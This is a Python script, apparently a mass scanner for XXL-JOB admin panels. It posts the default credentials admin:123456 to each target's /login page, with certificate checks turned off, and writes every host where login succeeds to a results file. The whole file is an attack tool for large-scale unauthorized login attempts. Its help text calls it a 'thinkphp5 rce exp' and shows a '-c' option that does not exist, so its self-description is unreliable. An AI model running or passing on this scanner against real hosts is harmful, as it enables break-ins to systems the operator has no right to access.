import argparse
import textwrap

import requests

requests.packages.urllib3.disable_warnings()


def main(url):
    full_url = f"{url}/login"
    data = {"userName": "admin", "password": "123456"}
    try:
        response = requests.post(full_url, data=data, allow_redirects=False, verify=False, timeout=5)

    except Exception:
        print(f'[-]{url}访问超时')
        return
    if response.status_code == 200 and '"code":200' in response.text:
        print(f'[+]{url}登录成功')
        return url
    else:
        print(f'[-]{url}登录失败')


if __name__ == '__main__':
    banner = """ 
               .__                 __      ___.    
___  ______  __|  |               |__| ____\_ |__  
\  \/  /\  \/  /  |    ______     |  |/  _ \| __ \ 
 >    <  >    <|  |__ /_____/     |  (  <_> ) \_\ \
/__/\_ \/__/\_ \____/         /\__|  |\____/|___  /
      \/      \/              \______|          \/
    """
    print(banner)
    parser = argparse.ArgumentParser(description='thinkphp5 rce exp',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''example:
            cve-2022-4334-rce.py -u http://192.168.1.108 -c id
            '''))
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.mhx.com:80")
    parser.add_argument("-f", "--file", dest="file", type=str, help="example: -f host.txt")
    parser.add_argument("-o", "--output", dest="output", type=str, help=" example: -o result.txt")
    args = parser.parse_args()
    if args.file:
        res_url = []
        with open(f"{args.file}", mode="r", encoding="u8") as f:
            for line in f:
                url = main(line.strip())
                if url:
                    res_url.append(url)
        with open("result1.txt", mode="w", encoding="u8") as f:
            for i in res_url:
                f.write(f"{i}存在弱口令 admin:123456\n")
    else:
        main(args.url)
